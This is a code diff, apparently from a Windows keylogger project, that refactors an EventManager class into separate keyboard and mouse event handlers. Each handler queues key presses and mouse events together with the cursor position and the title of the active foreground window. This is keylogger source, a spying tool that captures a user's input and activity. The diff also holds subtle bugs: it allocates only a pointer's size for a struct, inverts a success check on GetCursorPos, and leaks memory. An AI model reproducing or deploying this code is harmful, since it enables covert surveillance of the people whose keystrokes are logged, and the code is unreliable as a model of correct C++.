@@ -8,8 +8,6 @@
  * @param Keylogger&
  */
 EventManager::EventManager(Keylogger& keylogger) : _keylogger(keylogger) {
-
-	_context = (struct s_Context*)malloc(sizeof(t_Context));
 }
 
 EventManager::~EventManager()
@@ -17,35 +15,56 @@ EventManager::~EventManager()
 }
 
 /**
- * Call the Event Factory to create an event depending on parameters. 
+ * Call the Event Factory to create a keyboard event depending on parameters. 
  * @param LPARAM
  * @param WPARAM
  * @return void
  */
-void					EventManager::handleEvent(const WPARAM wParam, const LPARAM lParam) const{
+void					EventManager::handleKeyboardEvent(const WPARAM wParam, const LPARAM lParam) const{
+	
+	if (wParam == WM_KEYDOWN)
+	{ 
+		const AEvent* event = EventFactory::createKeyboardEvent(wParam, lParam, *updateContext());
+		_keylogger.pushToQueue(event);
+	}
+    return;
+}
+
+/**
+* Call the Event Factory to create a mouse event depending on parameters.
+* @param LPARAM
+* @param WPARAM
+* @return void
+*/
+void					EventManager::handleMouseEvent(const WPARAM wParam, const LPARAM lParam) const {
+	const AEvent* event = EventFactory::createMouseEvent(wParam, lParam, *updateContext());
+	_keylogger.pushToQueue(event);
+	return;
+}
+
+/** 
+* Update the context
+* returns false if error happened.
+*/
+const t_Context			*EventManager::updateContext() const
+{
 	int					length;
 	HWND				window;
-	if (GetCursorPos(_context->_mousePos))
-	{
-		std::cout << "GetCursorPos error !" << std::endl;
-	}
+	t_Context			*context;
+
+	if ((context = (t_Context*)malloc(sizeof(t_Context*))) == NULL)
+		return NULL;
+	if (GetCursorPos(context->_mousePos))
+		return NULL;
 	if ((window = GetForegroundWindow()) == NULL)
-	{
-		std::cout << "GetActiveWindow error !" << std::endl;
-	}
+		return NULL;
 	if ((length = GetWindowTextLength(window) + 1) == 1)
-	{
-		std::cout << "GetWindowTextLength error !" << std::endl;
-	}
+		return NULL;
 	char *str;
-	str = (char*)malloc(length);
+	if ((str = (char*)malloc(length)) == NULL)
+		return NULL;
 	if (GetWindowText(window, str, length) == 0)
-	{
-		std::cout << "GetWindowText error !" << std::endl;
-	}
-	const AEvent* event = EventFactory::create(wParam, lParam, *_context);
-	_keylogger.pushToQueue(event);
-	std::cout << "Event from : " << str << std::endl;
-	std::cout << "Event pushed." << std::endl;
-    return;
+		return NULL;
+	context->_windowTitle = str;
+	return context;
 }
